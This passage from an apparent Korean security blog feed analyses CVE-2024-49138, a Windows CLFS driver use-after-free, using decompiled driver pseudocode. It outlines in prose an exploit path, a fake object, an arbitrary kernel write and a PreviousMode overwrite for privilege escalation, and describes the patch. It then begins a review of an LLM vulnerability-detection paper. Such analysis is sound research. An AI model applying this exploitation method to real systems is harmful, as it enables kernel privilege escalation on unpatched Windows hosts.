class="hljs-keyword">int</span>)BlockType &gt;= <span class="hljs-keyword">this</span>-&gt;m_cBlocks )    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000225</span>LL;  <span class="hljs-keyword">if</span> ( ++<span class="hljs-keyword">this</span>-&gt;m_rgcBlockReferences[BlockType] != <span class="hljs-number">1</span> )    <span class="hljs-keyword">return</span> v4;  v4 = ((__int64 (__fastcall *)(_CClfsBaseFilePersisted *, _QWORD))<span class="hljs-keyword">this</span>-&gt;vftbl_0_00000001C0014000-&gt;CClfsBaseFilePersisted::ReadMetadataBlock(ulong))(         <span class="hljs-keyword">this</span>,         (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)BlockType);  <span class="hljs-keyword">if</span> ( (v4 &amp; <span class="hljs-number">0x80000000</span>) != <span class="hljs-number">0</span> )  {    --<span class="hljs-keyword">this</span>-&gt;m_rgcBlockReferences[BlockType];    <span class="hljs-keyword">return</span> v4;  }  <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;m_rgBlocks[BlockType].pbImage )    <span class="hljs-keyword">return</span> v4;[...]}</code></pre><p><code>CreateLogFile()</code> API&#xB97C; &#xD1B5;&#xD574; BLF &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xBA74; &#xC544;&#xB798; &#xC21C;&#xC11C;&#xB85C; &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>CClfsLogFcbPhysical::Initialize()</code> &#x2192; <code>CClfsBaseFilePersisted::OpenImage() -&gt; ReadImage()</code> &#x2192; <code>CClfsBaseFile::AcquireMetadataBlock()</code> </p><p><code>Initialize()</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; CClfsBaseFilePersisted &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; <code>AcquireMetadataBlock()</code> &#xD568;&#xC218;&#xB294; &#xBE14;&#xB85D;&#xC758; <code>m_rgcBlockReferences</code>&#xC758; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 0&#xC774;&#xB77C;&#xBA74;, <code>ReadMetadataBlock()</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xBE14;&#xB85D;&#xC744; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>_CClfsBaseFilePersisted.m_rgBlocks</code> &#xBC30;&#xC5F4;&#xC758; &#xD574;&#xB2F9; <code>pbImage</code> &#xD544;&#xB4DC;&#xC5D0; &#xBE14;&#xB85D;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xC124;&#xC815;&#xB418;&#xACE0;, <code>m_rgcBlockReferences</code> &#xBC30;&#xC5F4;&#xC758; &#xD574;&#xB2F9; &#xC778;&#xB371;&#xC2A4;&#xC5D0; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 1&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/18/ogu123/cve-2024-49138/image2.png" alt></p><p>&#xC704;&#xB294; <code>OpenImage()</code> &#xD568;&#xC218;&#xAC00; &#xC644;&#xB8CC;&#xB41C; &#xD6C4;&#xC758; &#xC0C1;&#xD0DC;&#xB85C; GENERAL &#xBE14;&#xB85D;&#xC774; <code>CClfsBaseFilePersisted.m_rgBlocks[2].pbImage = 0xFFFFD4000EF9A000</code>&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xACE0; &#xD574;&#xB2F9; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 1&#xB85C; &#xC124;&#xC815;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsBaseFilePersisted::LoadContainerQ</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _CClfsBaseFilePersisted *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *<span class="hljs-keyword">const</span> a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> __int8 a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">union</span> _CLS_LSN a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> __int64 *pcbContainer)</span></span><span class="hljs-function"></span>{[...] BaseLogRecord = CClfsBaseFile::GetBaseLogRecord(<span class="hljs-keyword">this</span>);[...] rgContainers = BaseLogRecord-&gt;rgContainers;[...] rgContainers_1 = rgContainers;[..] <span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)k &lt; MAX_CONTAINERS_DEFAULT )  {[...]    offset = rgContainers_1[k];    <span class="hljs-keyword">if</span> ( offset )    {      <span class="hljs-keyword">if</span> ( offset &lt; <span class="hljs-number">0x1338</span> )        <span class="hljs-keyword">goto</span> error;      <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)CClfsBaseFile::GetSymbol(<span class="hljs-keyword">this</span>, offset, k, (UCHAR **)&amp;container_context) &lt; <span class="hljs-number">0</span> )        <span class="hljs-keyword">goto</span> error;      container_context_2 = (CLFS_CONTAINER_CONTEXT *__shifted(_CLFSHASHSYM,<span class="hljs-number">0x30</span>))CClfsBaseFile::OffsetToAddr(                                                                                    <span class="hljs-keyword">this</span>,                                                                                    offset);      <span class="hljs-keyword">if</span> ( !container_context_2 )        <span class="hljs-keyword">goto</span> error;      v40 = (CLFS_CONTAINER_CONTEXT *)CClfsBaseFile::OffsetToAddr(<span class="hljs-keyword">this</span>, ADJ(container_context_2)-&gt;cbSymName);      v41 = v40;      <span class="hljs-keyword">if</span> ( !v40 )[...]      }      j_1 = (_CClfsContainer *)pcbContainer;      containerContext = container_context;[...] <span class="hljs-keyword">if</span> ( (containerContext-&gt;eState &amp; ClfsContainerInitializing) != <span class="hljs-number">0</span> )        {          containerContext-&gt;eState = ClfsContainerInactive;          ret = CClfsBaseFilePersisted::FlushImage(<span class="hljs-keyword">this</span>);            ret_2 = ret;          <span class="hljs-keyword">if</span> ( ret &lt; <span class="hljs-number">0</span> )            <span class="hljs-keyword">goto</span> LABEL_116;        }        v57 = &amp;a2[containerContext-&gt;cidQueue &amp; <span class="hljs-number">0x3FF</span>];        <span class="hljs-keyword">if</span> ( *v57 != <span class="hljs-number">-1</span> )        {LABEL_118:          ret = <span class="hljs-number">0xC01A000D</span>;          ret_2 = <span class="hljs-number">0xC01A000D</span>;LABEL_116:          ((<span class="hljs-keyword">void</span> (__fastcall *)(_CClfsContainer *))containerContext-&gt;pContainer-&gt;vftbl_0_00000001C0014040-&gt;CClfsContainer::Release(<span class="hljs-keyword">void</span>))(containerContext-&gt;pContainer);          containerContext-&gt;pContainer = <span class="hljs-number">0L</span>L;          v19 = a8;          v13 = a7;          v9 = a2;          <span class="hljs-keyword">goto</span> LABEL_145;[...]  }[...]}</code></pre><p><code>OpenImage()</code> &#xD568;&#xC218; &#xC774;&#xD6C4; <code>LoadContainerQ()</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>LoadContainerQ()</code> &#xD568;&#xC218;&#xB294; <code>_CLFS_BASE_RECORD_HEADER.rgContainers</code>&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xAC01; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; &#xB300;&#xD574; <code>containerContext-&gt;eState</code>&#xAC00; <code>ClfsContainerInitializing</code> &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xBA74; <code>ClfsContainerInactive</code> &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xACE0; &#xBCC0;&#xACBD;&#xB41C; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC0C1;&#xD0DC; &#xC815;&#xBCF4;&#xB97C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xBC18;&#xC601;&#xD558;&#xAE30; &#xC704;&#xD574; <code>CClfsBaseFilePersisted::FlushImage(this);</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">_int64 __fastcall <span class="hljs-title">CClfsBaseFilePersisted::WriteMetadataBlock</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _CClfsBaseFilePersisted *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">enum</span> _CLFS_METADATA_BLOCK_TYPE blocktype,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a3)</span></span><span class="hljs-function"></span>{  [...]  blockType_1 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)blocktype;  pbImage = (CLFS_LOG_BLOCK_HEADER *)<span class="hljs-keyword">this</span>-&gt;m_rgBlocks[blockType_1].pbImage;  v27 = pbImage;  <span class="hljs-keyword">if</span> ( !pbImage )  {    ret = <span class="hljs-number">0xC01A000D</span>;    ret_1 = <span class="hljs-number">0xC01A000D</span>;    <span class="hljs-keyword">goto</span> LABEL_23;  }  pbImagenotnull = <span class="hljs-number">1</span>;  recordOffset = pbImage-&gt;RecordOffsets[<span class="hljs-number">0</span>];  v11 = ++*(_QWORD *)(&amp;pbImage-&gt;MajorVersion + recordOffset) &amp; <span class="hljs-number">1L</span>L;  m_rgBlocks = <span class="hljs-keyword">this</span>-&gt;m_rgBlocks;  [...]LABEL_9:  <span class="hljs-keyword">if</span> ( v11 )    ++pbImage-&gt;Usn;  container_idx = <span class="hljs-number">0</span>;[...] <span class="hljs-keyword">while</span> ( container_idx &lt; MAX_CONTAINERS_DEFAULT )  {    ret_1 = CClfsBaseFile::AcquireContainerContext(<span class="hljs-keyword">this</span>, container_idx, &amp;containercontext);    v15 = &amp;<span class="hljs-keyword">this</span>-&gt;vftbl_0_00000001C0014000 + container_idx;    <span class="hljs-keyword">if</span> ( ret_1 &gt;= <span class="hljs-number">0</span> )    {      containercontext_1 = containercontext;      v15[<span class="hljs-number">56</span>] = (_CClfsBaseFilePersisted_VTABLE_0_00000001C0014000::vtable *)containercontext-&gt;pContainer;      containercontext_1-&gt;pContainer = <span class="hljs-number">0L</span>L;      CClfsBaseFile::ReleaseContainerContext(<span class="hljs-keyword">this</span>, &amp;containercontext);    }    <span class="hljs-keyword">else</span>    {      v15[<span class="hljs-number">56</span>] = <span class="hljs-number">0L</span>L;    }    v25 = ++container_idx;  }[...]ret = ClfsEncodeBlock(pbImage, pbImage-&gt;TotalSectorCount &lt;&lt; <span class="hljs-number">9</span>, pbImage-&gt;Usn, <span class="hljs-number">0x10</span>u, <span class="hljs-number">1u</span>);  ret_1 = ret;<span class="hljs-keyword">if</span> ( ret &gt;= <span class="hljs-number">0</span> )  {    encodeBlock_successul = <span class="hljs-number">1</span>;    ret = CClfsContainer::WriteSector(            (_CClfsContainer *)<span class="hljs-keyword">this</span>-&gt;pCclfsContainer,            (PRKEVENT)<span class="hljs-keyword">this</span>-&gt;event_a0,            <span class="hljs-number">0L</span>L,            <span class="hljs-keyword">this</span>-&gt;m_rgBlocks[blockType].pbImage,            pbImage-&gt;TotalSectorCount,            &amp;a6);    ret_1 = ret;[...] <span class="hljs-keyword">if</span> ( pbImagenotnull )  {    <span class="hljs-keyword">if</span> ( encodeBlock_successul )    {      v17 = ClfsDecodeBlock(pbImage, pbImage-&gt;TotalSectorCount, pbImage-&gt;Usn, <span class="hljs-number">0x10</span>u, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)&amp;a6);      <span class="hljs-keyword">if</span> ( v17 &lt; <span class="hljs-number">0</span> ){            CClfsBaseFile::ReleaseMetadataBlock(<span class="hljs-keyword">this</span>, (<span class="hljs-keyword">enum</span> _CLFS_METADATA_BLOCK_TYPE)blockType_1);       }[...]</code></pre><p><code>FlushImage()</code> &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; <code>CClfsBaseFilePersisted::WriteMetadataBlock()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCEE8;&#xD14C;&#xC774;&#xB108; <code>pContainer</code> &#xD544;&#xB4DC; &#xCD08;&#xAE30;&#xD654;<ul><li>&#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB4E4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA74;&#xC11C;, &#xAC01; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC758; <code>CLFS_CONTAINER_CONTEXT.pContainer</code> &#xD544;&#xB4DC;&#xB97C; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. (<code>containercontext_1-&gt;pContainer = 0LL;</code>). &#xC774;&#xB294; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xAE30; &#xC804;&#xC5D0; <code>CClfsContainer</code> &#xAC1D;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xCEE4;&#xB110; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBE44;&#xC6CC;&#xB450;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xC778;&#xCF54;&#xB529; &#x2192; &#xB514;&#xC2A4;&#xD06C; &#xC4F0;&#xAE30; &#x2192; &#xB514;&#xCF54;&#xB529;<ul><li><code>ClfsEncodeBlock()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBE14;&#xB85D;&#xC744; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC778;&#xCF54;&#xB529;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC778;&#xCF54;&#xB529;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; <code>CClfsContainer::WriteSector()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC744; BLF &#xD30C;&#xC77C;&#xC5D0; &#xC501;&#xB2C8;&#xB2E4;.</li><li>&#xB514;&#xC2A4;&#xD06C; &#xC4F0;&#xAE30; &#xC774;&#xD6C4;&#xC5D0;&#xB294; <code>ClfsDecodeBlock()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBE14;&#xB85D;&#xC744; &#xB2E4;&#xC2DC; &#xB514;&#xCF54;&#xB529; &#xD569;&#xB2C8;&#xB2E4; (&#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC6D0;&#xB798; &#xC0C1;&#xD0DC;&#xB85C; &#xBCF5;&#xC6D0;)</li></ul></li><li><code>ClfsDecodeBlock()</code> &#xC2E4;&#xD328; &#xC2DC; &#xCC98;&#xB9AC;<ul><li>&#xB9CC;&#xC57D; <code>ClfsDecodeBlock()</code>&#xC774; &#xC2E4;&#xD328;&#xD558;&#xBA74;, <code>CClfsBaseFile::ReleaseMetadataBlock()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; <code>CClfsBaseFilePersisted-&gt;m_rgcBlockReferences</code> &#xBC30;&#xC5F4;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xBE14;&#xB85D;&#xC758; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xB97C; &#xAC10;&#xC18C;&#xC2DC;&#xD0A4;&#xACE0;, &#xB9CC;&#xC57D; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;&#xAC00; 0&#xC774; &#xB418;&#xBA74; &#xD574;&#xB2F9; &#xBE14;&#xB85D;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ol><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>ReleaseMetadataBlock()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xB85C; GENERAL &#xBE14;&#xB85D;&#xC774; &#xD574;&#xC81C;&#xB418;&#xC5B4;&#xB3C4; &#xC774;&#xD6C4;&#xC5D0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xCEE4;&#xB110; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;&#xC778; <code>containerContext-&gt;pContainer</code>&#xB97C; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><img src="/2025/06/18/ogu123/cve-2024-49138/image3.gif" alt></p><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; <code>ClfsEncodeBlock()</code>&#xD568;&#xC218;&#xB294; &#xC131;&#xACF5;&#xD558;&#xACE0;, <code>ClfsDecodeBlock()</code>&#xD568;&#xC218;&#xB294; &#xC2E4;&#xD328;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790; &#xC545;&#xC131; BLF &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; clfs.sys&#xAC00; &#xBA54;&#xBAA8;&#xB9AC; &#xD574;&#xC81C; &#xD6C4; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, &#xACF5;&#xACA9;&#xC790; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xD574; &#xB454; fake &#xAC1D;&#xCCB4;&#xB97C; &#xD1B5;&#xD574; nt!DbgkpTriageDumpRestoreState &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; 8&#xBC14;&#xC774;&#xD2B8; &#xC784;&#xC758; &#xC4F0;&#xAE30;&#xB97C; &#xC5BB;&#xC5B4; &#xD604;&#xC7AC; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xAD8C;&#xD55C; &#xD544;&#xB4DC;(PreviousMode)&#xB97C; 0&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xC5EC; EoP&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD569;&#xB2C8;&#xB2E4;.</p><p>PreviousMode&#xB97C; &#xD1B5;&#xD574; Full Arbitrary Kernel Read/Write &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC5BB;&#xB294; &#xACFC;&#xC815;&#xC740; &#xC544;&#xB798; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! (&#xC0E4;&#xB77C;&#xC6C3; L0ch)</p><ul><li><a href="https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/">https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/</a></li></ul><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p><img src="/2025/06/18/ogu123/cve-2024-49138/image4.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>FlushImage()</code> &#xD638;&#xCD9C; &#xC804;&#xC5D0; <code>pContainer</code> &#xAC12;&#xC744; &#xBCC0;&#xC218;&#xC5D0; &#xBBF8;&#xB9AC; &#xC800;&#xC7A5;&#xD568;&#xC73C;&#xB85C;&#xC368;, <code>ClfsDecodeBlock()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC2E4;&#xD328;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xBBF8;&#xB9AC; &#xC800;&#xC7A5;&#xB41C; <code>pContainer</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/MrAle98/CVE-2024-49138-POC/tree/master">https://github.com/MrAle98/CVE-2024-49138-POC/tree/master</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/heap-overflow/">heap overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/EoP/">EoP</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/CLFS/">CLFS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/18/ogu123/cve-2024-49138/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] LLM Security &amp; Safety Part 2. VulBinLLM Review(KR)</title>
      <link>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/kr/</link>
      <guid>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/kr/</guid>
      <pubDate>Sun, 15 Jun 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/06/15/j0ker/llm_part2/kr/9xgtc2.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! &amp;#xBB34;&amp;#xB824; 6</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/06/15/j0ker/llm_part2/kr/9xgtc2.jpg" alt="index_img"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xBB34;&#xB824; 6&#xAC1C;&#xC6D4;&#xB9CC;&#xC5D0; &#xCC3E;&#xC544;&#xC628;&#x2026;. j0ker &#xC785;&#xB2C8;&#xB2E4;! 2025&#xB144; &#xC0C1;&#xBC18;&#xAE30;&#xC5D0; &#xAE00;&#xC774; &#xC5C6;&#xC5C8;&#xB358; &#xC774;&#xC720;&#xB294;&#x2026; &#xB108;&#xBB34; &#xBC14;&#xBE74;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#x314E;&#x314E; &#xBC14;&#xC05C; &#xC640;&#xC911;&#xC5D0;&#xB3C4; LLM &#xAD00;&#xB828; &#xD2B8;&#xB79C;&#xB4DC;&#xB294; &#xD314;&#xB85C;&#xC5C5;&#xC744; &#xC870;&#xAE08;&#xC529; &#xD558;&#xACE0; &#xC788;&#xC5C8;&#xB294;&#xB370;, &#xC810;&#xC810; &#xB354; &#xB9CE;&#xC740; &#xB17C;&#xBB38;&#xACFC; &#xAE30;&#xC220;&#xB4E4;&#xC774; &#xB098;&#xC624;&#xB2C8;&#xAE4C; &#xB530;&#xB77C;&#xAC00;&#xAE30;&#xAC00; &#xBC85;&#xCC39;&#xB2C8;&#xB2E4;&#x2026; &#xC0AC;&#xB78C; &#xC0B4;&#xB824;&#x2026; &#xC77C;&#xC740; &#xC5B8;&#xC81C;&#xD574;&#x2026;</p><p>&#xADF8;&#xB798;&#xC11C; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xD2B8;&#xB79C;&#xB4DC;&#xB97C; &#xC815;&#xB9AC;&#xD558;&#xAE30;&#xBCF4;&#xB2E4;&#xB294; &#xB2F9;&#xBD84;&#xAC04;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC77D;&#xC5C8;&#xB358; &#xAC83;&#xB4E4;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;. &#xC624;&#xB298; &#xB2E4;&#xB8F0; &#xB17C;&#xBB38;&#xC740; &#x201C;VulBinLLM: LLM-powered Vulnerability Detection for Stripped Binaries&#x201D; &#xC785;&#xB2C8;&#xB2E4;. LLM&#xC73C;&#xB85C; Stripped Binary &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294;&#xB2E4;&#xB294; &#xC18C;&#xB9AC;&#xC778;&#xB370;&#x2026; &#xC774;&#xAC8C; &#xC9C4;&#xC9DC; &#xB41C;&#xB2E4;&#xACE0;? &#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC73C;&#xB85C; &#xC77D;&#xC5B4;&#xBCF4;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/15/j0ker/llm_part2/kr/9xgth1.jpg" alt="image.jpg"></p><blockquote><p>&#xC798;&#xD558;&#xC790;&#x2026;?</p></blockquote><h2 id="1-LLM&#xC744;-&#xD65C;&#xC6A9;&#xD574;-&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xCC3E;&#xC744;-&#xC218;-&#xC788;&#xC744;&#xAE4C;"><a href="#1-LLM&#xC744;-&#xD65C;&#xC6A9;&#xD574;-&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xCC3E;&#xC744;-&#xC218;-&#xC788;&#xC744;&#xAE4C;" class="headerlink" title="1. LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;?"></a>1. LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;?</h2><p>&#xBA70;&#xCE60; &#xC804; Hackyboiz &#xC624;&#xD508;&#xC138;&#xBBF8;&#xB098;&#xC5D0;&#xC11C; fandu&#xB2D8;&#xC774; &#xBC1C;&#xD45C;&#xD588;&#xB358; &#xC8FC;&#xC81C;&#xC8E0;? &#x201C;&#xC57C;, &#xC774;&#xAC70; &#xC0AC;&#xB78C;&#xC774; &#xC77D;&#xAE30; &#xD798;&#xB4DC;&#xB2C8;&#xAE4C; LLM &#xC2DC;&#xCF1C;&#xBCF4;&#xBA74; &#xC548; &#xB3FC;?&#x201D; &#xB77C;&#xB294; &#xC544;&#xC8FC; &#xB2E8;&#xC21C;&#xD558;&#xC9C0;&#xB9CC; &#xAC15;&#xB825;&#xD55C; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xC8E0;. &#xC791;&#xB144; AIxCC&#xC5D0;&#xC11C; Team Atlanta&#xAC00; SQLite&#xC5D0;&#xC11C; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB97C; &#xCC3E;&#xC740;&#xC801;&#xB3C4; &#xC788;&#xACE0;, Project0&#xC5D0;&#xC11C;&#xB3C4; &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xC558;&#xB2E4;&#xACE0; &#xD558;&#xACE0;&#x2026;  &#xC774;&#xC81C; X&#xC5D0;&#xC11C;&#xB3C4; LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; Linux SMB&#xC5D0;&#xC11C; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC558;&#xB2E4;&#xB294; &#xAE00;&#xB3C4; &#xB098;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://sean.heelan.io/2025/05/22/how-i-used-o3-to-find-cve-2025-37899-a-remote-zeroday-vulnerability-in-the-linux-kernels-smb-implementation/">How I used o3 to find CVE-2025-37899, a remote zeroday vulnerability in the Linux kernel&#x2019;s SMB implementation</a></li></ul><p>&#xC774; &#xAE00;&#xC774; X(&#xAD6C; &#xD2B8;&#xC704;&#xD130;)&#xC5D0;&#xC11C; &#xAF64; &#xC774;&#xC288;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/06/15/j0ker/llm_part2/kr/x_1.png" alt="image.png"></p><blockquote><p>&#xC5C4;&#xCCAD;&#xB09C; &#xC88B;&#xC544;&#xC694;&#xC640; &#xB9AC;&#xD2B8;&#xC717;&#xC218;&#x2026;. &#xC6B0;&#xB9AC; &#xD300; 